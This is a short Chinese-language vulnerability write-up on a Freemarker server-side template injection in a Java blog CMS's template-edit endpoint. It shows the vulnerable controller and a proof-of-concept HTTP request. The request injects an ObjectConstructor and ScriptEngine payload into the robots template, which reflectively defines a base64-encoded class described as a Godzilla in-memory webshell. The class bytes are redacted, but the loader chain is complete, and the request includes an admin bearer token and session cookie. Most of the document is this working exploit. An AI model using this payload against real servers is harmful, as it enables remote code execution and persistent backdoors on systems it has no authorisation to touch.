# Freemarker-SSTI

漏洞代码

com.zyd.blog.controller.RestTemplateController

直接接收来自客户端传入的template对象，然后更新模板文件，导致SSTI

```java
@RequiresPermissions("template:edit")
    @PostMapping("/edit")
    @BussinessLog("编辑模板")
    public ResponseVO edit(Template template) {
        try {
            templateService.updateSelective(template);
        } catch (Exception e) {
            e.printStackTrace();
            return ResultUtil.error("模板修改失败！");
        }
        return ResultUtil.success(ResponseStatus.SUCCESS);
    }
```

POC

注入哥斯拉内存马

```http
POST /template/edit HTTP/1.1
Host: 192.168.239.1:8085
Content-Length: 17016
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.239.1:8085
Referer: http://192.168.239.1:8085/templates
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1770000191,1770084448,1770775295,1770789903; Admin-Token=Bearer%20eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiIxLGFkbWluIiwiaXNzIjoiYWRtaW4iLCJleHAiOjE3NzI2MTE2ODMsImlhdCI6MTc3MjAwNjg4Mywicm9sIjoiUk9MRV9BRE1JTiJ9.65EHSg_M2s71XNnkLXB3fOQvqWMC0iDmGoJL47IVF-d1yqs5HT4wFO_uXy4I0QmPA3FrAfkJCeR9KwFqnNNgWw; JSESSIONID=1bc183fd-9777-4c72-91a6-161fab4cd0e2
Connection: keep-alive

id=4&refKey=TM_ROBOTS&refValue=Crawl-delay%3A+6%0D%0A%24%7B'freemarker.template.utility.ObjectConstructor'%3Fnew()('javax.script.ScriptEngineManager').getEngineByName('js').eval('var+classLoader+%3D+java.lang.Thread.currentThread().getContextClassLoader()%3Bvar+className+%3D+%22org.apache.commons.lang.l.SOAPUtils%22%3Bvar+base64Str+%3D+%22yv66xxxxxxxxAAA%3D%22%3Btry+%7B+classLoader.loadClass(className).newInstance()%3B%7D+catch+(e)+%7B+var+clsString+%3D+classLoader.loadClass(%22java.lang.String%22)%3B+var+bytecode%3B+try+%7B+var+clsBase64+%3D+classLoader.loadClass(%22java.util.Base64%22)%3B+var+clsDecoder+%3D+classLoader.loadClass(%22java.util.Base64%24Decoder%22)%3B+var+decoder+%3D+clsBase64.getMethod(%22getDecoder%22).invoke(base64Clz)%3B+bytecode+%3D+clsDecoder.getMethod(%22decode%22%2C+clsString).invoke(decoder%2C+base64Str)%3B+%7D+catch+(ee)+%7B+try+%7B+var+datatypeConverterClz+%3D+classLoader.loadClass(%22javax.xml.bind.DatatypeConverter%22)%3B+bytecode+%3D+datatypeConverterClz.getMethod(%22parseBase64Binary%22%2C+clsString).invoke(datatypeConverterClz%2C+base64Str)%3B+%7D+catch+(eee)+%7B+var+clazz1+%3D+classLoader.loadClass(%22sun.misc.BASE64Decoder%22)%3B+bytecode+%3D+clazz1.newInstance().decodeBuffer(base64Str)%3B+%7D+%7D+var+clsClassLoader+%3D+classLoader.loadClass(%22java.lang.ClassLoader%22)%3B+var+clsByteArray+%3D+(new+java.lang.String(%22a%22).getBytes().getClass())%3B+var+clsInt+%3D+java.lang.Integer.TYPE%3B+var+defineClass+%3D+clsClassLoader.getDeclaredMethod(%22defineClass%22%2C+%5BclsByteArray%2C+clsInt%2C+clsInt%5D)%3B+defineClass.setAccessible(true)%3B+var+clazz+%3D+defineClass.invoke(classLoader%2C+bytecode%2C+new+java.lang.Integer(0)%2C+new+java.lang.Integer(bytecode.length))%3B+clazz.newInstance()%3B%7D')%7D%0D%0ASitemap%3A+%24%7Bconfig.cmsUrl%7D%2Fsitemap.txt%0D%0ASitemap%3A+%24%7Bconfig.cmsUrl%7D%2Fsitemap.xml%0D%0ASitemap%3A+%24%7Bconfig.cmsUrl%7D%2Fsitemap.html%0D%0A
```

